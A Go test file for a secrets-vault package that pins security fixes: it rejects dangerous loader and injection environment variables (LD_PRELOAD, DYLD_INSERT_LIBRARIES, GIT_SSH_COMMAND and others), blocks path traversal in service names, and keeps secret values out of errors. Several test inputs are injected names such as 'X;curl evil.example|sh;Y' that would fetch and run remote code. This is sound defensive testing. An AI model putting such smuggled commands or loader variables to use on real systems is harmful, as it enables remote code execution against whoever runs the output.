package vault

import (
	"bytes"
	"strings"
	"testing"

	"github.com/99designs/keyring"
)

// Regression tests for the Phase 1 security fixes. Each one pins a behaviour
// whose loss would reopen a hole, so keep them even if they look redundant with
// a narrower unit test.

func TestValidateEnvNameRejectsLoaderFamilies(t *testing.T) {
	bad := []string{
		"LD_AUDIT", "ld_debug_output", "DYLD_FRAMEWORK_PATH", "DYLD_FALLBACK_LIBRARY_PATH",
		"GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_SSH_COMMAND",
		"SANDUK_TRUST", "sanduk_file_passphrase",
		"PYTHONPATH", "PERL5LIB", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "PROMPT_COMMAND", "IFS", "GCONV_PATH",
	}
	for _, n := range bad {
		if err := ValidateEnvName(n); err == nil {
			t.Errorf("ValidateEnvName(%q) = nil, want an error", n)
		}
	}
	for _, n := range []string{"DB_URL", "OPENAI_API_KEY", "PATH", "LDAP_URL", "GIT_TOKEN"} {
		if err := ValidateEnvName(n); err != nil {
			t.Errorf("ValidateEnvName(%q) = %v, want nil", n, err)
		}
	}
}

// A name that is not a plain identifier must never reach export: the shell and
// dotenv formats print names unquoted, so this one would run a command in
// whoever evals the output.
func TestFormatEnvRejectsInjectedName(t *testing.T) {
	env := map[string]string{"X;curl evil.example|sh;Y": "v"}
	for _, f := range []string{FormatShell, FormatDotenv, FormatJSON} {
		var buf bytes.Buffer
		if err := FormatEnv(&buf, env, f); err == nil {
			t.Errorf("FormatEnv(%s) accepted an injected name, wrote %q", f, buf.String())
		}
		if buf.Len() != 0 {
			t.Errorf("FormatEnv(%s) wrote output before failing: %q", f, buf.String())
		}
	}
}

func TestFormatEnvRejectsLoaderName(t *testing.T) {
	var buf bytes.Buffer
	if err := FormatEnv(&buf, map[string]string{"LD_PRELOAD": "/tmp/x.so"}, FormatShell); err == nil {
		t.Fatal("FormatEnv accepted LD_PRELOAD")
	}
}

func TestExecRejectsLoaderName(t *testing.T) {
	// Exec validates before looking the command up, so this never runs anything.
	err := Exec("definitely-not-a-command", nil, map[string]string{"DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"})
	if err == nil || !strings.Contains(err.Error(), "DYLD_INSERT_LIBRARIES") {
		t.Fatalf("Exec = %v, want a refusal naming DYLD_INSERT_LIBRARIES", err)
	}
}

func TestParseDotenvRejectsInvalidKey(t *testing.T) {
	for _, in := range []string{"X;curl evil|sh;Y=1\n", "A B=1\n", "1A=1\n", "A-B=1\n"} {
		if _, err := ParseDotenv([]byte(in)); err == nil {
			t.Errorf("ParseDotenv(%q) accepted an invalid key", in)
		}
	}
}

func TestParseDotenvErrorDoesNotEchoValue(t *testing.T) {
	_, err := ParseDotenv([]byte(`K="sk-test"value-tail` + "\n"))
	if err == nil {
		t.Fatal("expected an error for text after the closing quote")
	}
	if strings.Contains(err.Error(), "value-tail") {
		t.Fatalf("error echoes part of the value: %v", err)
	}
}

func TestDotenvRefusesUnrepresentableDollar(t *testing.T) {
	var buf bytes.Buffer
	err := FormatEnv(&buf, map[string]string{"K": "it's ${HOME}"}, FormatDotenv)
	if err == nil {
		t.Fatalf("FormatEnv wrote %q; a double-quoted $ would be expanded by the reader", buf.String())
	}
	if strings.Contains(err.Error(), "HOME") {
		t.Fatalf("error echoes the value: %v", err)
	}
}

func TestEmptyEntryNameIsRejected(t *testing.T) {
	v := newFileVault(t)
	if err := v.AddSecret("", "sk-test-value"); err == nil {
		t.Fatal("AddSecret accepted an empty name")
	}
	if _, err := v.Get(""); err == nil {
		t.Fatal("Get accepted an empty name")
	}
	if err := v.Remove(""); err == nil {
		t.Fatal("Remove accepted an empty name")
	}
}

func TestServiceNameRejectsPaths(t *testing.T) {
	for _, s := range []string{"../../x", "a/b", `a\b`, ".", ".."} {
		t.Setenv("SANDUK_SERVICE", s)
		if _, err := serviceName(); err == nil {
			t.Errorf("serviceName accepted %q", s)
		}
	}
	t.Setenv("SANDUK_SERVICE", "work")
	if got, err := serviceName(); err != nil || got != "work" {
		t.Fatalf("serviceName(work) = %q, %v", got, err)
	}
}

// With no backend set exactly one keystore is offered to keyring.Open, which
// otherwise moves on to the next backend when one fails to open and so could
// put new secrets in kwallet or pass because D-Bus hiccuped.
func TestDefaultNativeBackendPicksExactlyOne(t *testing.T) {
	linux := []keyring.BackendType{keyring.SecretServiceBackend, keyring.KWalletBackend, keyring.PassBackend}
	if b, ok := defaultNativeBackend("linux", linux); !ok || b != keyring.SecretServiceBackend {
		t.Fatalf("linux = %v, %v; want secret-service", b, ok)
	}
	if b, ok := defaultNativeBackend("darwin", []keyring.BackendType{keyring.KeychainBackend, keyring.PassBackend}); !ok || b != keyring.KeychainBackend {
		t.Fatalf("darwin = %v, %v; want keychain", b, ok)
	}
	if b, ok := defaultNativeBackend("windows", []keyring.BackendType{keyring.WinCredBackend}); !ok || b != keyring.WinCredBackend {
		t.Fatalf("windows = %v, %v; want wincred", b, ok)
	}
	// A CGO_ENABLED=0 macOS build has pass but no Keychain: that must fall back
	// to the age file, not silently pick pass.
	if b, ok := defaultNativeBackend("darwin", []keyring.BackendType{keyring.PassBackend}); ok {
		t.Fatalf("darwin without keychain picked %v; want no native backend", b)
	}
	if _, ok := defaultNativeBackend("linux", []keyring.BackendType{keyring.KWalletBackend, keyring.PassBackend}); ok {
		t.Fatal("kwallet/pass must never be chosen implicitly")
	}
}
